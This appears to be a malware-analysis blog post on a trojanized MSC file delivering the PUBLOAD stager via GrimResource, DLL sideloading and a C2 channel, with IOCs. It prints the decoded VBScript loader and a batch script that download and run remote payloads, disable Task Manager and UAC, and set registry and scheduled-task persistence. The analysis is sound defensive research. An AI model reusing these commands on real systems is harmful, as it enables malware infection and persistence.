---
title: PUBLOAD Likely Delivered to Thailand via GrimResource MSC
by: dmpdump
tags: malware RE CTI apt cn
---

On December 20, 2024, a Microsoft Management Console (MSC) file named "Invitation Letter.msc" was uploaded from Thailand to VirusTotal.

* File name: Invitation Letter.msc
* Hash: 5b18f8b379cb32945ef7722b7ec175f5d24e7c468f6f5d593c51610f6b87f21f

![sshot](/assets/images/PUBLOAD_Thai/vt_upload.png) 

I have been tracking the use of trojanized MSC files since ~ early 2024, which increased temporarily after Elastic published their [GrimResource -  Microsoft Management Console for initial access and evasion](https://www.elastic.co/security-labs/grimresource) article.

Invitation Letter.msc implements a curl download for a batch file using the GrimResource technique.

![sshot](/assets/images/PUBLOAD_Thai/grimres.png) 

The URL-decoded script shows the batch file download and execution:

```xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
	<![CDATA[
Set wshshell = CreateObject("WScript.Shell")
Wshshell.run "cmd.exe /c conhost.exe --headless --width 20 --height 30 curl -s --progress-bar --retry 98 -C - --output C:\Users\Public\jisu.bat http://185[.]62.57.118/jisu.RAR & C:\Users\Public\jisu.bat"
]]></ms:script>
</stylesheet>
```
Jisu.bat performs the following actions:
* It disables the Task Manager via a registry change (setting DisableTaskMgr to 1)
* It modifies the EnableLUA value in the System Policies, setting it to 0. This disables UAC notifications (UAC was formerly known as LUA)
* It establishes persistence for jisucommon.exe via the registry run key
* It creates a scheduled task named Office_Settings to download and execute jisu.bat every 6 minutes
* It downloads jisucommon.exe and FileAssociation.dll to the Public folder
* It runs jisucommon.exe

```batch
@echo off
start /min
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v jisucommon /t reg_sz /d C:\Users\Public\jisucommon.exe /f
schtasks /Create /F /TN Office_settings /SC minute /MO 6 /TR "cmd.exe /c curl -s --retry 99 -C - --output C:\Users\Public\jisu.bat http://185[.]62.57.118/jisu.RAR & C:\Users\Public\jisu.bat"
curl -s --retry 99 -C - --output C:\Users\Public\jisucommon.exe http://185[.]62.57.118/jisucommon.rar
curl -s --retry 99 -C - --output C:\Users\Public\FileAssociation.dll http://185[.]62.57.118/FileAssociation.rar
cd C:\Users\Public\
jisucommon.exe
exit
```
Jisucommon.exe is a legitimate executable associated with Jisu Office, a legitimate application that seems to offer file converters. The threat actor used this legitimate application for DLL hijacking purposes, loading a malicious FileAssociation.dll, which is dynamically loaded by jisucommon.exe

![sshot](/assets/images/PUBLOAD_Thai/jisucommon.png) 
![sshot](/assets/images/PUBLOAD_Thai/fileassocload.png) 

FileAssociation.dll has a PDB path with a tone of humor, as it has been referenced in previous reports. The username associated with the project is 'FBI'.
![sshot](/assets/images/PUBLOAD_Thai/pdb.png)

The legitimate executable and the trojanized DLL are copied to ProgramData for persistence.
![sshot](/assets/images/PUBLOAD_Thai/copiedfiles.png)

Two types of persistence are implemented: A scheduled task, and via the registry run key.

<u>Registry run key in HKLM and HKCU:</u>

![sshot](/assets/images/PUBLOAD_Thai/regpersist.png)

<u>Scheduled Task:</u>

![sshot](/assets/images/PUBLOAD_Thai/schtaskpersist.png)

The DLL decrypts an embedded shellcode and loads it via a callback function, using EnumPropsExW().

![sshot](/assets/images/PUBLOAD_Thai/scdecryptexec.png)

The decrypted shellcode is a PUBLOAD stager, previously reported by [Cisco](https://blog.talosintelligence.com/mustang-panda-targets-europe/) and [TrendMicro](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html). The shellcode implements a common API hashing algorithm using ROR13. The following APIs are resolved via the hashing algorithm:

![sshot](/assets/images/PUBLOAD_Thai/loadlibgetproc.png)
![sshot](/assets/images/PUBLOAD_Thai/resapis.png)

The shellcode establishes a socket connection to 45.150.128\[.\]212:443, and it's able to receive and execute additional shellcodes. The information harvested and sent to the C2 (volume serial number, computer name, username, uptime) is encrypted with the same RC4 key reported by Cisco and Trend Micro.
![sshot](/assets/images/PUBLOAD_Thai/rc4key.png)


# IOCs
* Invitation Letter.msc: 5b18f8b379cb32945ef7722b7ec175f5d24e7c468f6f5d593c51610f6b87f21f
* Initial payload delivery: 185\[.\]62.57.118
* jisu.bat: 51a180669443596d313f27f9d4a59eff8b79856d9656828935b55cfcd2e234de
* jisucommon.exe: 381b0dac4c410ebaa37ee1172461a84bea87e9b0c32648556f42b9d510afe8cd
* FileAssociation.dll: d0cf78977f2b744ae3fd88da6532c3ff08af2961f553a7469e7416445d4f4432 
* C2: 45.150.128\[.\]212:443

# Previous reports
* [https://blog.talosintelligence.com/mustang-panda-targets-europe/](https://blog.talosintelligence.com/mustang-panda-targets-europe/)
* [https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html)
* [https://www.elastic.co/security-labs/grimresource](https://www.elastic.co/security-labs/grimresource)
